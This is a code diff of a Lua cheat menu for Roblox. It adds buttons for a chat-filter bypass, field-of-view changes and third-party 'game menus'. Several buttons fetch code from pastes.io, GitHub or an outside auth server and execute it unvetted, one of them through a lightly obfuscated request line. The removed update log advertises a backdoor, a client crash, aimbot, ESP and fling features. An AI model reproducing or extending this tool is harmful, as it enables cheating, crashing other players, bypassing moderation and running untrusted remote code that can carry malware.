@@ -3086,37 +3086,59 @@ bomb(289, 5) --// change values if client crashes
 end
 end)
 
+NewFeaturesTab:NewButton("Chat bypass", "bypasses chat", function()
+    loadstring(game:HttpGet('https://pastes.io/raw/lstrrfipqq'))();
+end)
+
+NewFeaturesTab:NewButton("Fov 120", "changes fov", function()
+    local FovNumber = 120 --Enter your FOV number here
+    local Camera = workspace.CurrentCamera
+    Camera.FieldOfView = FovNumber
+end)
+
+NewFeaturesTab:NewButton("Fov 90", "changes fov", function()
+    local FovNumber = 90 --Enter your FOV number here
+    local Camera = workspace.CurrentCamera
+    Camera.FieldOfView = FovNumber
+end)
+
+NewFeaturesTab:NewButton("Fov 80", "changes fov", function()
+    local FovNumber = 80 --Enter your FOV number here
+    local Camera = workspace.CurrentCamera
+    Camera.FieldOfView = FovNumber
+end)
+
+NewFeaturesTab:NewButton("Fov 50", "changes fov", function()
+    local FovNumber = 50 --Enter your FOV number here
+    local Camera = workspace.CurrentCamera
+    Camera.FieldOfView = FovNumber
+end)
+
 --always above
 NewFeaturesTab:NewLabel("so quick talk the library that i use")
 NewFeaturesTab:NewLabel("doesnt let me create one other tab")
 NewFeaturesTab:NewLabel("so new features goes to here")
 
-NewFeaturesTab:NewButton("Chat bypass", "bypasses chat", function()
-    loadstring(game:HttpGet('https://pastes.io/raw/lstrrfipqq'))();
-end)
-
 local UpdateLog = Window:NewTab("Update Logs")
 local UpdateLogTab = UpdateLog:NewSection("Update logs")
 
-UpdateLogTab:NewLabel("Backdoor added (op)")
-UpdateLogTab:NewLabel("Added hitbox")
-UpdateLogTab:NewLabel("Added Aimbot :O")
-UpdateLogTab:NewLabel("Added Esp :O")
-UpdateLogTab:NewLabel("Keybind to close the menu")
-UpdateLogTab:NewLabel("Added Player Interact")
-UpdateLogTab:NewLabel("Added crash (op)")
-UpdateLogTab:NewLabel("New Fling script (really op)")
+UpdateLogTab:NewLabel("New game script")
+UpdateLogTab:NewLabel("Added Fov Changer")
+UpdateLogTab:NewLabel("New Fling script (stopped working on the same day)")
 UpdateLogTab:NewLabel("chatbypass script really epic")
 UpdateLogTab:NewLabel("----------------------------------------")
 
 local QuickUpdateLog = UpdateLog:NewSection("Quick Updates")
 
-QuickUpdateLog:NewLabel("Improved Noclip p to open/close")
+QuickUpdateLog:NewLabel("Fixed some label issues")
 
-local FutureUpdate = Window:NewTab("Future Updates")
-local FutureUpdateTab = FutureUpdate:NewSection("Future Updates")
+local FutureUpdate = Window:NewTab("Game Menus")
+local FutureUpdateTab = FutureUpdate:NewSection("Game Menus")
 
-FutureUpdateTab:NewLabel("Mad city Menu / Game Menus")
-FutureUpdateTab:NewButton("Eclipse Hub MM2", "ye", function()
+FutureUpdateTab:NewButton("Eclipse Hub MM2", "works in many games btw", function()
 local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+end)
+
+FutureUpdateTab:NewButton("School Rp V3", "weird ass game ong", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/nlfes/School-Rp-v3-script/main/balls"))()
 end)
